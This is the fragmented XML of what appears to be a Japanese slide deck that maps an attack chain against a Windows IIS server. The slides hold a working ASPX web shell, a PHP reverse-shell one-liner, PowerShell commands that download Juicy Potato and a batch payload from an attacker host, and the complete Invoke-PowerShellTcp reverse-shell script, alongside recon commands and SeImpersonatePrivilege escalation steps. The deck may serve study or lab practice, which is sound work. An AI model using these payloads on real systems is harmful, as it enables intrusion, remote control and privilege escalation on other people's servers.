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クリックしてスライドを移動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クリックしてノートの書式を編集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&lt;ヘッダー&gt;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r">
              <a:buNone/>
            </a:pPr>
            <a:fld id="{C9CF6122-0715-40B6-BB23-E93A845BAD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&lt;番号&gt;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設定：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 server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のファイルアップロードに設定ミス（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php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がアップロード可能）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SeImpersonatePrivilege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が適用されてしまっている状態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4A7F66-BCF0-4EDC-86EE-006CB0BD648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前提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SSH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ポート開いてる、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ssh server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がインストールされており、通信が可能であること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権限昇格のコマンド</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="2000"/>
            </a:b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ちゃんと理解すること。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説明文↓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130E3EC-9341-41FC-A680-BDEDE1CD215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タイトル スライド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A1F206-4A34-4690-912F-86DA07CBB1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クリックしてアウトラインのテキストを編集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6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7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タイトル スライド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6502B6-8E2F-48B3-AEB1-7AEB70CF80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クリックしてアウトラインのテキストを編集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6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7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タイトルと縦書きテキスト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151357-3AE3-4758-A916-0C7ED72B92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縦書きタイトルと&#10;縦書きテキスト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A0284E-D8E4-4A8C-B2ED-A8CAAD7387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タイトルとコンテン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AE36B4-C7C0-4549-BCD0-BD3660464A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セクション見出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60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ja-JP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7A7D1E-7C5B-4945-BE9C-39282BD96F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つのコンテン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C702C3-C8D0-4299-9025-D52C8CC85D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ja-JP" sz="2400" b="1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6053F5-9E4B-4511-8144-2ED2DA5955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タイトルのみ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44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2E61C3-B971-488A-AE51-F73A28B7D8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白紙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C0F8BD-B40F-4DB8-9635-465667A20D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タイトル付きのコンテン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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" sz="2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 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 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5AE8C-32E4-4534-92E8-B7CC32AB6F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タイトル付きの図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 Light"/>
              </a:rPr>
              <a:t>マスター タイトルの書式設定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クリックしてアウトラインのテキストを編集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2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3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4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5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6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第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7</a:t>
            </a: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レベル アウトライン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ja-JP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マスター テキストの書式設定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游ゴシック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&lt;日付/時刻&gt;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E42F03-0AA7-47FE-B9BF-6A7523CAE1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游ゴシック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四角形: 角を丸くする 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5642640" y="3161880"/>
            <a:ext cx="757080" cy="3308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Attacker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コネクタ: 曲線 6"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="71" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="5495760" y="2533320"/>
            <a:ext cx="146880" cy="794160"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49877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73" name="コネクタ: 曲線 12"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="71" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6399720" y="2975760"/>
            <a:ext cx="809640" cy="352080"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5004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74" name="コネクタ: 曲線 13"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="71" idx="3"/>
            <a:endCxn id="75" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6399720" y="3327480"/>
            <a:ext cx="789120" cy="833760"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50022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76" name="テキスト ボックス 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7137000" y="2868120"/>
            <a:ext cx="8528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Reconnaissance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テキスト ボックス 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7418880" y="3537000"/>
            <a:ext cx="792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Weaponization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テキスト ボックス 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4860000" y="2340000"/>
            <a:ext cx="661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Exploitation</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="700"/>
            </a:b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Persistence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" name="コネクタ: 曲線 14"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="7979760" y="2440080"/>
            <a:ext cx="828000" cy="536040"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50021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80" name="コネクタ: 曲線 16"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8021880" y="2957760"/>
            <a:ext cx="836280" cy="252000"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50043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81" name="テキスト ボックス 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8915760" y="2346480"/>
            <a:ext cx="549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Portscan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テキスト ボックス 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8921160" y="3117600"/>
            <a:ext cx="5706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Hostscan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コネクタ: 曲線 34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9481320" y="2220120"/>
            <a:ext cx="516600" cy="2260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84" name="テキスト ボックス 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9973080" y="2153160"/>
            <a:ext cx="622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Nmap  -sV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コネクタ: 曲線 37"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9456480" y="2437200"/>
            <a:ext cx="516600" cy="99360"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50069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86" name="テキスト ボックス 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9911880" y="2440800"/>
            <a:ext cx="1030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Nc –v -z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コネクタ: 曲線 43"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9515520" y="2955240"/>
            <a:ext cx="560160" cy="257040"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50032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88" name="コネクタ: 曲線 44"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="82" idx="3"/>
            <a:endCxn id="89" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9491760" y="3192480"/>
            <a:ext cx="1357920" cy="25560"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50013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90" name="テキスト ボックス 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10031760" y="2863080"/>
            <a:ext cx="896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Ping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テキスト ボックス 46"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10849320" y="3092400"/>
            <a:ext cx="1062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nc –v –w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コネクタ: 曲線 47"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="77" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8210880" y="3637080"/>
            <a:ext cx="1050120" cy="17280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92" name="コネクタ: 曲線 48"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="77" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8210880" y="3637080"/>
            <a:ext cx="742680" cy="390600"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50048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93" name="コネクタ: 曲線 77"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1" rot="5400000">
            <a:off x="7889040" y="2009520"/>
            <a:ext cx="1030320" cy="775800"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49982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94" name="テキスト ボックス 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8643960" y="1706400"/>
            <a:ext cx="505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website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コネクタ: 曲線 81"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9205200" y="1485720"/>
            <a:ext cx="540360" cy="22932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96" name="テキスト ボックス 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9747720" y="1362240"/>
            <a:ext cx="7405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SQL Injection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コネクタ: 曲線 85"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9064800" y="1145880"/>
            <a:ext cx="702720" cy="570600"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50025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98" name="テキスト ボックス 89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9682560" y="1053000"/>
            <a:ext cx="982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Command Injection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コネクタ: 曲線 90"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="10800000">
            <a:off x="4632480" y="3428640"/>
            <a:ext cx="1010520" cy="934560"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 4996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00" name="テキスト ボックス 93"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3697920" y="4235040"/>
            <a:ext cx="9795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Plivilege escalation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コネクタ: 曲線 41"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="71" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6399720" y="3327480"/>
            <a:ext cx="1001160" cy="291240"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50035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75" name="テキスト ボックス 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7188480" y="4060800"/>
            <a:ext cx="730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Initial Access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テキスト ボックス 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8912160" y="3955680"/>
            <a:ext cx="531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php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テキスト ボックス 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7361640" y="4627080"/>
            <a:ext cx="129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Php reverseshell command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コネクタ: 曲線 51"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="16200000">
            <a:off x="7801200" y="4230720"/>
            <a:ext cx="443520" cy="337680"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5004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05" name="コネクタ: 曲線 54"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="82" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9491760" y="3217680"/>
            <a:ext cx="1173960" cy="361080"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5003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06" name="テキスト ボックス 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10564920" y="3483360"/>
            <a:ext cx="10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Nmap –sn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コネクタ: 曲線 56"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="8119800" y="4974120"/>
            <a:ext cx="279720" cy="1296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08" name="コネクタ: 曲線 62"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="4533840" y="2485800"/>
            <a:ext cx="326160" cy="25200"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 4994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09" name="テキスト ボックス 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="140400" y="206640"/>
            <a:ext cx="75564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Approach1:Windows IIS server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テキスト ボックス 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1431000" y="2046600"/>
            <a:ext cx="3249000" cy="833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&lt;%@ Page Language="C#" %&gt;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&lt;%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if (Request["cmd"] != null)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System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]);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%&gt;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コネクタ: 曲線 67"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1" rot="5400000">
            <a:off x="8574480" y="951120"/>
            <a:ext cx="1208880" cy="384480"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49985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12" name="テキスト ボックス 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9246600" y="325080"/>
            <a:ext cx="601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Robots.txt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テキスト ボックス 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2680920" y="4300200"/>
            <a:ext cx="739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Whoami /priv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コネクタ: 曲線 5"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="10800000">
            <a:off x="3308400" y="4319640"/>
            <a:ext cx="389880" cy="7200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15" name="テキスト ボックス 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9260640" y="3737160"/>
            <a:ext cx="734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Prepare tools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コネクタ: 曲線 27"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9941040" y="3831480"/>
            <a:ext cx="654480" cy="124200"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50027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17" name="テキスト ボックス 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10573920" y="3805920"/>
            <a:ext cx="981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jp.exe(juicy potato)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コネクタ: 曲線 95"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="9034560" y="1733400"/>
            <a:ext cx="732960" cy="4680"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5002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19" name="テキスト ボックス 97"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9729720" y="1650600"/>
            <a:ext cx="780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Directory scan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コネクタ: 曲線 99"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10472400" y="1739520"/>
            <a:ext cx="306720" cy="15120"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50058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21" name="テキスト ボックス 101"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10724400" y="1662480"/>
            <a:ext cx="998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Dirb &lt;URL&gt; &lt;dic&gt;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コネクタ: 曲線 124"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="110" idx="1"/>
            <a:endCxn id="123" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="1259640" y="2237400"/>
            <a:ext cx="171360" cy="226440"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 4989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24" name="コネクタ: 曲線 129"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="123" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="16200000">
            <a:off x="516600" y="1931400"/>
            <a:ext cx="392400" cy="15480"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 4995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25" name="コネクタ: 曲線 133"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1" rot="5400000">
            <a:off x="11154960" y="1439280"/>
            <a:ext cx="275400" cy="137880"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49869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26" name="テキスト ボックス 135"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11071080" y="1148760"/>
            <a:ext cx="1120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Credencial information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コネクタ: 曲線 19"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="16200000">
            <a:off x="9224280" y="4100400"/>
            <a:ext cx="262800" cy="240120"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50068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28" name="テキスト ボックス 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8643960" y="4390200"/>
            <a:ext cx="3404880" cy="3074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Access.php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Php –r ‘$sock=fsockopen(“ipaddress port);exec(“/bin/sh –I &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”)’;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テキスト ボックス 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7284600" y="5072760"/>
            <a:ext cx="3404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Php –r ‘$sock=fsockopen(“ipaddress port);exec(“/bin/sh –I &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”)’;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テキスト ボックス 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="975960" y="4320000"/>
            <a:ext cx="1364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Find SeimpersonatePrivilege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コネクタ: 曲線 52"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="10800000">
            <a:off x="2303640" y="4410000"/>
            <a:ext cx="402480" cy="18000"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 49955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32" name="コネクタ: 曲線 58"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="130" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="1414440" y="4669200"/>
            <a:ext cx="393480" cy="946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33" name="コネクタ: 曲線 63"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="115" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9994680" y="3837240"/>
            <a:ext cx="541800" cy="318600"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50066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34" name="テキスト ボックス 73"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10472760" y="4043880"/>
            <a:ext cx="14331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Python3 –m http.server 8080</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="700"/>
            </a:b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(victim download juicy potato)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テキスト ボックス 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="500400" y="4860000"/>
            <a:ext cx="435960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PowerShell “(new-object System.Net.WebClient).Downloadfile(‘http://attackerIP:8080/jp.exe,’jp.exe’)”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-84600" y="5400000"/>
            <a:ext cx="7896600" cy="21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ＭＳ ゴシック;Noto Sans JP;游ゴシック;メイリオ"/>
              </a:rPr>
              <a:t> (New-Object System.Net.WebClient).DownloadFile("http://attackerIP:8080/shell.bat", "C:\Users\victim\Desktop\shell.bat")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ＭＳ ゴシック;Noto Sans JP;游ゴシック;メイリオ"/>
              <a:ea typeface="ＭＳ ゴシック;Noto Sans JP;游ゴシック;メイリオ"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="137" name="コネクタ: 曲線 4"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="1290600" y="5156280"/>
            <a:ext cx="393480" cy="946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38" name="コネクタ: 曲線 1"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="1196280" y="5696280"/>
            <a:ext cx="393480" cy="946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39" name="コネクタ: 曲線 9"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="1290600" y="5156280"/>
            <a:ext cx="393480" cy="946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40" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="900000" y="5953680"/>
            <a:ext cx="2188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slide(shell.bat)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80000" y="2135160"/>
            <a:ext cx="1080000" cy="2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C:\inetpub\wwwroot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0" y="1495800"/>
            <a:ext cx="306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C:\&gt; move shell.aspx C:\inetpub\wwwroot\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0" y="1041480"/>
            <a:ext cx="2520000" cy="21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http://TARGET_IP/shell.aspx?cmd=whoami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コネクタ: 曲線 15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1" rot="16200000">
            <a:off x="1056600" y="1416240"/>
            <a:ext cx="392400" cy="15480"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 4995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45" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4028040" y="2046600"/>
            <a:ext cx="651960" cy="2048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wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p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Shell.aspx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テキスト ボックス 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="180000" y="468000"/>
            <a:ext cx="3793680" cy="46591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function Invoke-PowerShellTcp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{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[CmdletBinding(Def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	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aultParameterSetName="reverse")] Param(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[Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]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[Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]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[String]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$IPAddress,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[Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]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[Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]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[Int]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$Port,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[Parameter(ParameterSetName="reverse")]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[Switch]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$Reverse,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[Parameter(ParameterSetName="bind")]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[Switch]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$Bind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try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#Connect back if the reverse switch is used.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if ($Reverse)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$client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)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#Bind to the provided port if Bind switch is used.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if ($Bind)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$listener = [System.Net.Sockets.TcpListener]$Port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$listener.start()   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$client = $listener.AcceptTcpClient()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}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109400" y="468000"/>
            <a:ext cx="7770600" cy="5189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$stream = $client.GetStream()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[byte[]]$bytes = 0..65535|%{0}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#Send back current username and computername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$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")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$stream.Write($sendbytes,0,$sendbytes.Length)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#Show an interactive PowerShell prompt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$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&gt;')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$stream.Write($sendbytes,0,$sendbytes.Length)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while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 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$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding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$data = $EncodedText.GetString($bytes,0, $i)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try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    #Execute the command on the target.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    $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String 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catch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    Write-Warning "Something went wrong with execution of command on the target."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    Write-Error $_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$sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&gt; '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$x = ($error[0] | Out-String)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$error.clear()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$sendback2 = $sendback2 + $x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#Return the results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$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)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$stream.Write($sendbyte,0,$sendbyte.Length)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$stream.Flush() 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$client.Close()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if ($listener)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    $listener.Stop()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catch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{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Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."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    Write-Error $_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}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}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Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port 9999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60000" y="121680"/>
            <a:ext cx="1070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Shell.bat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四角形: 角を丸くする 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5794920" y="2651040"/>
            <a:ext cx="757080" cy="3308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Attacker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0" name="コネクタ: 曲線 7"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="149" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="5015160" y="2584080"/>
            <a:ext cx="780120" cy="23292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51" name="コネクタ: 曲線 12"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="149" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6552000" y="2464920"/>
            <a:ext cx="810000" cy="352080"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50022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52" name="コネクタ: 曲線 13"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="149" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6552000" y="2816640"/>
            <a:ext cx="607320" cy="520920"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50059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53" name="テキスト ボックス 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7289280" y="2357280"/>
            <a:ext cx="8528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Reconnaissance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テキスト ボックス 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7571160" y="3026160"/>
            <a:ext cx="792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Weaponization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テキスト ボックス 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4367160" y="2488680"/>
            <a:ext cx="6685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Persistence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コネクタ: 曲線 14"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="153" idx="3"/>
            <a:endCxn id="157" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="8142120" y="1890720"/>
            <a:ext cx="977400" cy="567000"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val 5549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58" name="コネクタ: 曲線 16"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
